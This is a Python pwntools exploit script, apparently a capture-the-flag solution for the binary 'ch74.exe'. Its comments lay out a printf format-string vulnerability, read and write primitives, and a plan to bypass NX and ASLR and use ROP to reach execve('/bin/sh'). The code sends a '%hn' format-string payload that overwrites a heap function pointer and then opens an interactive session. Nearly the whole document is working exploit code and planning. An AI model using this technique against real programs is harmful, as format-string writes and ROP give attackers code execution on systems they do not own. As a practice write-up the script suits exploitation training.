from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#binary = ELF("")
#libc = ELF("")
#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}


#p = process("ch74.exe")
p = gdb.debug('./ch74.exe', '''
break *main+197
watch *0x403390
''')

'''
0. Vulnerabilility
    - Format string vulnerability
    - printf(email)

1. Read Primitive
    - format string provides leak with '%x' & '%p'
    - printf(email)

2. Write Primitive
    - 512 bytes in msg with 'B' padding 
    - format string can write to 'B' padding memory address
    - '\n' format string writes the number of bytes to
      a memory address

3. Bypassing Protections
    - NX    : Bypassed by writing to function pointer on heap.
    - ASLR  : Information leak confirmed.
              Calculate offsets for ROP.

3. Exploit Method
    - use the read primitive to find where to write
    - Use read primitive to leak stack & library locations.

    Testing:
    - Overwrite: "void (*pf)(int) = _exit;"
    - Leak binary/library address + ROP
    - No shellcode, if I can ROP mprotect() then I can ROP
      execve('/bin/sh', 0, 0) instead.
    - Return to main and fill up msg[1024], overflow msg into
      _exit() variable.

4. Libraries
        ntdll.dll => /cygdrive/c/Windows/SYSTEM32/ntdll.dll (0x7ffb228c0000)
        KERNEL32.DLL => /cygdrive/c/Windows/System32/KERNEL32.DLL (0x7ffb216a0000)
        KERNELBASE.dll => /cygdrive/c/Windows/System32/KERNELBASE.dll (0x7ffb1eb00000)
        cygwin1.dll => /usr/bin/cygwin1.dll (0x180040000)

'''

heap_pf = p64(0x403390)

# Name
print(p.recvline())
p.sendline(b'A' * 31)

'''
Email = Read Primitive (leak) & What-To-Write

1. 6 bytes Overwrite
    %n  = 0x7f1400000009
    DLL ->  |__|xxxxxxxx <- 6 bytes user control

2. 4 bytes Overwrite
    %hn = 0x7fe60f9f0009
    DLL ->  |______|xxxx <- 4 bytes user control

We can only read 12 bytes into email buffer. This isn't
enough space to manipulate &pf(). Using '%hn' fills out
6 bytes, then all we need to fill out is 2 bytes.
'''

payload = b'%9p' + b'%8$hn'


print(p.recvline())
p.sendline(payload)


# Message = Write Primitive (Heap is RW)
# Found *pf() on the heap
# '%n' overwrites pf() on the heap.
# msg[1024]
# read(0, msg, 512)
print(p.recvline())
p.sendline(heap_pf)

p.recvline()
p.interactive()


